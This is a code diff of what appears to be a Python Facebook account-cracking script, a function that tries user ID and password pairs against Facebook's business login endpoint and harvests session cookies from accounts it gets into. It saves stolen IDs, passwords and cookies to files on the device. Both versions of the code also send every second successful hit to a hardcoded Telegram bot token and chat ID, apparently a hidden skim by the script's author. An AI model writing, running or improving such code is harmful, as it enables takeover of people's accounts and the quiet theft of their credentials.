@@ -1812,43 +1812,39 @@ def mbasic(uid,pwx,tl):
 }
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348131"
-            po = Session.post(url, cookies=cookies, headers=headers, data=data).text
+            po = Session.post(url,cookies=cookies, headers=headers, data=data).text
             response = Session.cookies.get_dict().keys()
-            if response.status_code == 200:
-              if "c_user" in response:
-                  cok = Session.cookies.get_dict()
-                  cid = cok["c_user"]
-                  coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                  check = check_lock(cid)
-                  if "live" in check:
-                      if '%3A-1%3A-1' in coki:
-                          print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                          open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                          break
-                      else:
-                          bkas.append(cid)
-                          if len(bkas)% 2 == 0:
-                             statusok = (f"{cid}|{pw}|{coki}")
-                             requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
-                          else:
-                             print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                             print(f" {green}Cookie : {green}{coki}")
-                             open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                             oks.append(cid)
-                             break
-                  else:
-                      break
-              elif 'checkpoint' in response:
-                  uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                  #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                  open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
-                  cps.append(uid)
-                  break
-              else
-                  break
+            if "c_user" in response:
+                cok = Session.cookies.get_dict()
+                cid = cok["c_user"]
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                check = check_lock(cid)
+                if "live" in check:
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        break
+                    else:
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
+                else:
+                    break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
             else:
-                 print(f"\r\033[1;91m [ERROR] - Status code {po.status_code}")
-                 continue
+                continue
         loop+=1
     except ce:
         time.sleep(20)
